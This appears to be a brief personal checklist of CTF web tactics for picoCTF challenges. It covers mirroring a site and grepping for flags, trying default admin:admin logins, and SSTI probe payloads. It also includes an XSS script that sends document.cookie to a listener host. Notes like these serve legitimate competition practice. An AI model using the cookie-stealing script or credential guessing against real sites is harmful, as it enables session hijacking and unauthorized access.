- Go through robots.txt
- If it's reading through source or something do:
	- wget -m http://ctfSite.com && wget http://ctfSite.com/robots.txt && grep -R "picoCTF"
		- "" could be "ctfName" or "{" or "}" or "picoCTF{.\*?}"


- Facing login page:
	- Try admin:admin
	- Try signup as admin:admin
	- Login as a normal user and then try to retrieve cookie through a posting page like 
			- <script>new Image().src='http://listening?c='+document.cookie</script>

- Facing giving many details about yourself:
	- You could try SSTI by putting this payload in everything:
	- ```
	  {{8*8}}
	  {{10+10}}
